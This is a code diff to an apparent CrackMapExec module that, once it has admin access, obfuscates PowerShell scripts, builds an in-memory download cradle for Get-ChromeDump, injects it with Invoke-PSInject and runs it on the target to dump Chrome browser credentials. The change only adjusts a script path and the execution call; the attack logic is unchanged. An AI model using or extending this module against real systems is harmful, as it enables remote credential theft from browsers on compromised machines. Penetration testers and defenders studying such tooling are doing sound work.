@@ -19,7 +19,7 @@ class CMEModule:
         '''
         '''
 
-        self.ps_script1 = obfs_ps_script('Invoke-PSInject.ps1')
+        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
         self.ps_script2 = obfs_ps_script('randomps-scripts/Get-ChromeDump.ps1')
 
     def on_admin_login(self, context, connection):
@@ -28,9 +28,8 @@ class CMEModule:
         chrome_cmd = gen_ps_iex_cradle(context, 'Get-ChromeDump.ps1', command)
 
         launcher = gen_ps_inject(chrome_cmd, context)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
